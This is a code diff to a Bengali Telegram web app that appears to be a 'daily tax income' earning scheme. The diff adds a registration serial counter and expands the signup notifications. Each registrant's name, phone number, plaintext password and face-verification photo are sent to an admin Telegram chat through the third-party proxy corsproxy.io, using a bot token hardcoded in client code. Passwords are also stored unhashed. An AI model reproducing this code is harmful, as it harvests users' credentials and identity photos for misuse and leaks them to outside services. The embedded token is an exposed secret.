@@ -27,7 +27,7 @@ body { font-family: 'Plus Jakarta Sans', sans-serif; background: linear-gradient
 .input-field:focus { border-color: #fbbf24; box-shadow: 0 0 10px rgba(251,191,36,0.3); }
 .input-icon { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); font-size: 16px; color: #34d399; }
 
-.file-upload-box { background: rgba(2, 44, 34, 0.9); border: 1.5 dashed #10b981; border-radius: 18px; padding: 12px; margin-bottom: 14px; text-align: left; }
+.file-upload-box { background: rgba(2, 44, 34, 0.9); border: 1.5px dashed #10b981; border-radius: 18px; padding: 12px; margin-bottom: 14px; text-align: left; }
 .file-upload-label { display: block; font-size: 12px; color: #34d399; font-weight: 700; text-align: center; margin-bottom: 6px; }
 
 .auth-btn { background: linear-gradient(135deg, #fbbf24, #f59e0b); color: #022c22; border: none; padding: 14px; font-size: 16px; font-weight: 800; border-radius: 30px; cursor: pointer; width: 100%; margin-top: 10px; box-shadow: 0 6px 20px rgba(245,158,11,0.4); transition: transform 0.2s; }
@@ -37,7 +37,6 @@ body { font-family: 'Plus Jakarta Sans', sans-serif; background: linear-gradient
 .forgot-pass-link { color: #fbbf24; text-decoration: none; cursor: pointer; }
 .forgot-pass-link:hover { text-decoration: underline; }
 
-/* ড্যাশবোর্ড ও অন্যান্য স্টাইল */
 .card { background: rgba(6, 78, 59, 0.85); padding: 16px; border-radius: 18px; box-shadow: 0 6px 20px rgba(0,0,0,0.3); margin-bottom: 12px; border: 1.5px solid rgba(16, 185, 129, 0.3); text-align: center; }
 .live-date-banner { background: linear-gradient(135deg, rgba(16, 185, 129, 0.2), rgba(251, 191, 36, 0.2)); border: 1.5px solid rgba(16, 185, 129, 0.4); border-radius: 14px; padding: 10px; margin-bottom: 12px; text-align: center; }
 .balance-card { background: linear-gradient(135deg, #ef4444, #991b1b, #065f46); color: white; border-radius: 20px; padding: 18px; margin-bottom: 12px; text-align: left; border: 1px solid rgba(255,255,255,0.1); }
@@ -46,7 +45,6 @@ body { font-family: 'Plus Jakarta Sans', sans-serif; background: linear-gradient
 .stat-title { font-size: 11px; color: #a7f3d0; font-weight: 700; margin-bottom: 4px; }
 .stat-value { font-size: 20px; font-weight: 800; color: #f8fafc; }
 
-/* মোডাল স্টাইল */
 .custom-modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(2, 44, 34, 0.85); backdrop-filter: blur(8px); display: none; align-items: center; justify-content: center; z-index: 9999; padding: 15px; }
 .custom-modal-overlay.active { display: flex; }
 .custom-modal-box { background: #064e3b; border: 2px solid #34d399; border-radius: 24px; width: 100%; max-width: 340px; padding: 20px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.6); color: #f8fafc; }
@@ -88,7 +86,7 @@ body { font-family: 'Plus Jakarta Sans', sans-serif; background: linear-gradient
     </div>
 </div>
 
-<!-- ২. নিবন্ধন (রেজিস্ট্রেশন) পেজ -->
+<!-- ২. নিবন্ধন পেজ -->
 <div id="page-register" class="page">
     <div class="auth-card">
         <div class="auth-header-title">নিবন্ধন</div>
@@ -119,7 +117,7 @@ body { font-family: 'Plus Jakarta Sans', sans-serif; background: linear-gradient
     </div>
 </div>
 
-<!-- ৩. হোম পেজ (ড্যাশবোর্ড) -->
+<!-- ৩. হোম পেজ -->
 <div id="page-home" class="page">
     <div class="live-date-banner">
         <div style="font-size: 11px; font-weight: 700; color: #34d399; text-transform: uppercase;">📅 আজকের রিয়েল-টাইম তারিখ</div>
@@ -130,7 +128,7 @@ body { font-family: 'Plus Jakarta Sans', sans-serif; background: linear-gradient
         <img id="user-profile-pic" src="https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f464.png" alt="Profile" style="width: 46px; height: 46px; border-radius: 50%; object-fit: cover; border: 2px solid #34d399; background: #022c22;">
         <div style="overflow: hidden; flex: 1;">
             <div style="font-size: 14px; font-weight: 800; color: #fbbf24;">👋 স্বাগতম, <span id="user-display-name">ইউজার</span></div>
-            <div style="font-size: 11px; color: #a7f3d0; margin-top: 2px;">ফোন: <span id="user-display-phone" style="color: #34d399;">---</span></div>
+            <div style="font-size: 11px; color: #a7f3d0; margin-top: 2px;">ফোন: <span id="user-display-phone" style="color: #34d399;">---</span> | সিরিয়াল: <span id="user-display-serial" style="color: #34d399;">---</span></div>
         </div>
     </div>
 
@@ -160,7 +158,7 @@ body { font-family: 'Plus Jakarta Sans', sans-serif; background: linear-gradient
     </div>
 </div>
 
-<!-- ওয়েলকাম পপ-আপ মোডাল (যেমন স্ক্রিনশট 23920.jpg তে আছে) -->
+<!-- ওয়েলকাম পপ-আপ মোডাল -->
 <div id="welcome-modal" class="custom-modal-overlay">
     <div class="custom-modal-box">
         <div style="font-size: 22px; margin-bottom: 6px;">🔥 ডেইলি ট্যাক্স ইনকাম সেন্টার 🔥</div>
@@ -199,7 +197,7 @@ const db = firebase.firestore();
 const tg = window.Telegram.WebApp;
 tg.ready(); tg.expand();
 
-// আপনার টেলিগ্রাম বট কনফিগারেশন
+// টেলিগ্রাম বট কনফিগারেশন
 const botToken = "8535942512:AAHmpa8119aOZx6EZwOpaDhGteBPoxtzs_8";
 const adminChatId = "8040704140";
 
@@ -253,19 +251,44 @@ function closeWelcomeModal() {
     document.getElementById('welcome-modal').classList.remove('active');
 }
 
-// টেলিগ্রাম নোটিফিকেশন ফাংশন (সিওর ডেলিভারির জন্য ফাস্ট ফেচ)
-function sendTelegramAdminNotification(name, phone, password, hasPhoto) {
-    const message = `🔥 <b>নতুন ইউজারের সফল নিবন্ধন!</b> 🔥\n━━━━━━━━━━━━━━━━━━━━━━\n👤 <b>নাম:</b> ${name}\n📱 <b>ফোন নম্বর:</b> ${phone}\n🔑 <b>পাসওয়ার্ড:</b> <code>${password}</code>\n📸 <b>ফেস ভেরিফিকেশন ছবি:</b> ${hasPhoto ? 'আপলোড সম্পন্ন ✅' : 'নেই'}\n📅 <b>সময়:</b> ${new Date().toLocaleString('bn-BD')}\n━━━━━━━━━━━━━━━━━━━━━━`;
+// ১. টেক্সট নোটিফিকেশন পাঠানোর ফাংশন (যেমন ছবির উপরে দেওয়া আছে)
+async function sendTelegramTextNotification(name, phone, password, serial) {
+    const nowStr = new Date().toLocaleString('bn-BD', { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' });
+    const message = `🚀 <b>নতুন মেম্বার রেজিস্ট্রেশন!</b> 🚀\n━━━━━━━━━━━━━━━━━━━━━━\n👤 <b>নাম:</b> ${name}\n📱 <b>ফোন নম্বর:</b> ${phone}\n🔑 <b>পাসওয়ার্ড:</b> <code>${password}</code>\n🔢 <b>সিরিয়াল নাম্বার:</b> #${serial}\n📅 <b>তারিখ:</b> ${nowStr}\n━━━━━━━━━━━━━━━━━━━━━━`;
     
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: adminChatId,
-            text: message,
-            parse_mode: 'HTML'
-        })
-    }).catch(e => console.log("Telegram error:", e));
+    const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(`https://api.telegram.org/bot${botToken}/sendMessage`);
+    try {
+        await fetch(proxyUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: adminChatId,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch (e) {
+        console.log("Telegram text notification error:", e);
+    }
+}
+
+// ২. ছবি ও ক্যাপশন পাঠানোর ফাংশন (যেমন ছবির নিচে দেওয়া আছে)
+async function sendTelegramPhotoNotification(name, serial, photoFile) {
+    const caption = `📸 #${serial} সিরিয়ালের ইউজারের ভেরিফিকেশন ছবি (${name})`;
+    const formData = new FormData();
+    formData.append('chat_id', adminChatId);
+    formData.append('photo', photoFile);
+    formData.append('caption', caption);
+
+    const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(`https://api.telegram.org/bot${botToken}/sendPhoto`);
+    try {
+        await fetch(proxyUrl, {
+            method: 'POST',
+            body: formData
+        });
+    } catch (e) {
+        console.log("Telegram photo notification error:", e);
+    }
 }
 
 // ইমেজ কম্প্রেশন
@@ -321,6 +344,19 @@ async function handleRegistration() {
             return;
         }
 
+        // সিরিয়াল নম্বর জেনারেট করার জন্য কাউন্টার চেক
+        let serial = 1;
+        const counterRef = db.collection('settings').doc('counter');
+        const counterSnap = await counterRef.get();
+        if (counterSnap.exists) {
+            serial = (counterSnap.data().lastSerial || 0) + 1;
+            await counterRef.update({ lastSerial: serial });
+        } else {
+            const usersSnap = await db.collection('users').get();
+            serial = usersSnap.size + 1;
+            await counterRef.set({ lastSerial: serial });
+        }
+
         const photoFile = photoInput.files[0];
 
         compressImage(photoFile, async function(compressedPhotoUrl) {
@@ -330,6 +366,7 @@ async function handleRegistration() {
                     phone: phone,
                     password: password,
                     photoUrl: compressedPhotoUrl,
+                    serial: serial,
                     balance: 0,
                     dailyWatched: 0,
                     refers: 0,
@@ -338,15 +375,16 @@ async function handleRegistration() {
 
                 await userRef.set(userData);
                 
-                // টেলিগ্রাম বটে নোটিফিকেশন পাঠানো
-                sendTelegramAdminNotification(name, phone, password, true);
+                // টেলিগ্রাম বটে টেক্সট এবং ছবি নোটিফিকেশন পাঠানো
+                sendTelegramTextNotification(name, phone, password, serial);
+                sendTelegramPhotoNotification(name, serial, photoFile);
 
                 localStorage.setItem('logged_user_phone', phone);
                 currentUserPhone = phone;
 
                 tg.showAlert("🎉 নিবন্ধন সফল হয়েছে!");
                 loadUserData(phone);
-                openWelcomeModal(); // সফল রেজিস্টার হলে ওয়েলকাম মোডাল দেখাবে
+                openWelcomeModal();
             } catch (saveErr) {
                 tg.showAlert("❌ ডেটা সংরক্ষণ করতে সমস্যা হয়েছে। আবার চেষ্টা করুন।");
             }
@@ -404,6 +442,7 @@ async function loadUserData(phone) {
             
             document.getElementById('user-display-name').innerText = data.name;
             document.getElementById('user-display-phone').innerText = data.phone;
+            document.getElementById('user-display-serial').innerText = "#" + (data.serial || 1);
             document.getElementById('user-display-balance').innerText = currentBalance;
             document.getElementById('dash-task').innerText = data.dailyWatched || 0;
             document.getElementById('dash-refer').innerText = data.refers || 0;
